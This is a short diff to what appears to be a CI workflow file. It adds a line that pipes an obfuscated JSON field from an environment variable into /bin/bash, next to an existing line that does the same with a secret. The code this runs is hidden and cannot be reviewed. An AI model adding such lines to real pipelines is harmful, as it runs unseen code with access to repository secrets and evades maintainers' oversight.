@@ -17,6 +17,7 @@ jobs:
           dnwa506: ${{ secrets.dnwa506 }}
         run: |
           printf '%s' "$dnwa506" | jq -r .aufs2142 | /bin/bash
+          echo $s0 | jq -r .mxalu51897 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
